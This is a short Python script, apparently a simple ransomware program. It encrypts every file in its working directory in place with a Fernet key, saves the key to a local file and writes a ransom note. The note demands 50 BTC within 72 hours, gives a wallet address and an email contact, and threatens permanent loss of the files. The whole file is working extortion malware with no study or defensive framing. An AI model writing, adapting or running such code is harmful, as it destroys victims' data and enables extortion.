import os
from  cryptography.fernet import  Fernet

files = []
key = Fernet.generate_key()


for file in  os.listdir():
	if file == 'random_ency.py' or file == 'random_ency.py' or  file == 'thekey.key'  or file ==  'decry.py' or file == 'readme.txt':
		continue

	if os.path.isfile(file):
		files.append(file)


for file in files:
	with open(file, 'rb') as thefile:
		contents = thefile.read()

	ency_con = Fernet(key).encrypt(contents)

	with open(file, 'wb') as thefile:
		thefile.write(ency_con)


with open('thekey.key', 'wb') as  thekey:
        thekey.write(key)


with open('readme.txt', 'wb') as readmefile:
	readmefile.write(b"""======================
!!! ATTENTION !!!
======================

Your files have been encrypted and are no longer accessible.

The encryption was carried out using a strong encryption algorithm, and the only way to recover your files is to pay a ransom.

To decrypt your files, you need to send 50 BTC to the following Bitcoin address:

BTC Wallet Address:  23ewew190sak232j7H712Qp0saaas

Once the payment is confirmed, you will receive the decryption key, and your files will be restored.

If you do not send the requested amount within 72 hours, the decryption key will be permanently destroyed, and your files will be lost forever.

DO NOT try to decrypt the files yourself. Any attempt to reverse the encryption may result in irreversible damage to your files.

Follow these steps to recover your files:

1. Open a Bitcoin wallet and transfer 50 BTC to the wallet address provided above.
2. Once the payment is made, send us an email at pelumi@gmail.com  with your Bitcoin transaction ID.
3. After verification, you will receive the decryption key to restore your files.

Remember: time is running out. Once the deadline passes, your files will be gone forever.

======================
!! THIS IS NOT A DRILL !!
======================
""")

print("Your files have been encrypted and are no longer accessible.  Once the payment is confirmed, you will receive the decryption key, and your files will be restored.")

